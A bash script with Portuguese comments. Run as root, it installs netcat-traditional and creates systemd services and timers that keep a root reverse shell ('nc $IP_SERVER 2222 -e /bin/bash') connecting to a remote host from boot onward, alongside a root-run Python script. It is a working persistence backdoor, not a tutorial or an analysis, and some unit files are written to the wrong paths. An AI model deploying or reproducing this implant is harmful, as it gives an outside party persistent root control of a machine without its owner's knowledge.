#!/bin/bash

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

SERVICE_NC="nc.service"
TIMER_NC="nc.timer"
SERVICE_PY="py.service"
TIMER_PY="py.timer"

sudo apt remove netcat-openbsd -y

# Verificar se o Netcat está instalado
if ! command -v nc &> /dev/null; then
    echo "Netcat não está instalado. Por favor, instale o Netcat e execute este script novamente."
    sudo apt install netcat-traditional -y
    exit 1
fi

# Criar arquivo de NETCAT
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=1m
# ExecStart=bash -c 'if ! pgrep -x "nc" >/dev/null; then sudo nc -w 1 $IP_SERVER 2222 -e /bin/bash &; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVICE_NC"

# Criar arquivo de TIMER do NETCAT
echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SERVICE_TIMER/$TIMER_NC"

# Criar arquivo de PY
# ExecStart=bash -c 'if ! pgrep -x "play.py" >/dev/null; then python3 $INIT_DIR/$ACTUALL/play.py; fi'
# ExecStart=bash -c 'pgrep -x "play.py" || { python3 $INIT_DIR/$ACTUALL/play.py & };'
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=1m
ExecStart=bash -c 'if ! pgrep -x "sudo nc" >/dev/null || ! pgrep -f "sudo nc" >/dev/null; then sudo nc -w 1 $IP_SERVER 2222 -e /bin/bash; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVICE_NC"

# Criar arquivo de TIMER do PY
echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SERVICE_TIMER/$TIMER_NC"

# Criar arquivo de PYTHON
echo "[Unit]
Description=Netcat Server
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=bash -c 'if ! pgrep -x "play.py" >/dev/null; then sudo python3 $INIT_DIR/$ACTUALL/tools/play.py; fi'
User=$USER


[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVICE_PY"

# Criar arquivo de TIMER do PYTHON
echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SERVICE_TIMER/$TIMER_PY"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask $SERVICE_NC
sudo systemctl start $SERVICE_NC
sudo systemctl enable $SERVICE_NC
sudo systemctl unmask $TIMER_NC
sudo systemctl start $TIMER_NC
sudo systemctl enable $TIMER_NC
sudo systemctl unmask $SERVICE_PY
sudo systemctl start $SERVICE_PY
sudo systemctl enable $SERVICE_PY
sudo systemctl unmask $TIMER_PY
sudo systemctl start $TIMER_PY
sudo systemctl enable $TIMER_PY

echo "Configuração do serviço Netcat concluída."